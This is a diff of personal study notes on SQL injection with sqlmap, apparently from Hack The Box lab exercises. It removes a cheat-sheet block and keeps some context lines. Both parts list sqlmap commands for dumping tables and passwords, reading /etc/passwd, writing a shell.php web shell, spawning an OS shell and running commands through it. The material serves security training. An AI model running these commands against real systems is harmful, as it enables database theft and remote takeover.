@@ -3,7 +3,7 @@
 **SQL Injection Fundermentals**  
 
 
-## SQLMAP Intallation  
+## SQLmap Intallation  
 sudo apt install sqlmap  
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 
@@ -152,58 +152,10 @@ sqlmap -u "http://134.209.176.83:31022/?id=1" --file-read "/var/www/html/flag.tx
    47  sqlmap -u "http://134.209.176.83:31022/?id=1" --os-shell
    in browser DO http://134.209.176.83:31022/shell.php?cmd=cat+/flag.txt
 
+### Useful Links
 https://medium.com/@joshthedev/step-13-sqlmap-essentials-68829d907492
 
 
 
 -------- SQL Essentials (HTB) ----------
 
-SQLMap 
-
-Install from package manager or git 
-sudo apt install sqlmap
-cd /etc/share/sqlmap/
-git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
-
-
-Default run paramae
-python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
-sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
-
-sqlmap -u "http://138.68.141.81:30913/case3.php" --data='id=1' --method PUT
-  -H "Connection: keep-alive" ^
-  -H "Upgrade-Insecure-Requests: 1" ^
-  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36" ^
-  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ^
-  -H "Referer: http://138.68.141.81:30913/" ^
-  -H "Accept-Language: en-US,en;q=0.9" ^
-  -H "Cookie: id=1" ^
-  --compressed ^
-  --insecure
-
-
-Run SQLMap without asking for user input
-sqlmap -u "http://www.example.com/vuln.php?id=1" --batch	
-
-sqlmap 'http://www.example.com/' --data 'uid=1&name=test'	SQLMap with POST request
-sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'	POST request specifying an injection point with an asterisk
-sqlmap -r req.txt	Passing an HTTP request file to SQLMap
-sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'	Specifying a cookie header
-sqlmap -u www.target.com --data='id=1' --method PUT	Specifying a PUT request
-sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt	Store traffic to an output file
-sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch	Specify verbosity level
-sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"	Specifying a prefix or suffix
-sqlmap -u www.example.com/?id=1 -v 3 --level=5	Specifying the level and risk
-sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba	Basic DB enumeration
-sqlmap -u "http://www.example.com/?id=1" --tables -D testdb	Table enumeration
-sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname	Table/row enumeration
-sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"	Conditional enumeration
-sqlmap -u "http://www.example.com/?id=1" --schema	Database schema enumeration
-sqlmap -u "http://www.example.com/?id=1" --search -T user	Searching for data
-sqlmap -u "http://www.example.com/?id=1" --passwords --batch	Password enumeration and cracking
-sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"	Anti-CSRF token bypass
-sqlmap --list-tampers	List all tamper scripts
-sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba	Check for DBA privileges
-sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"	Reading a local file
-sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"	Writing a file
-sqlmap -u "http://www.example.com/?id=1" --os-shell	Spawning an OS shell
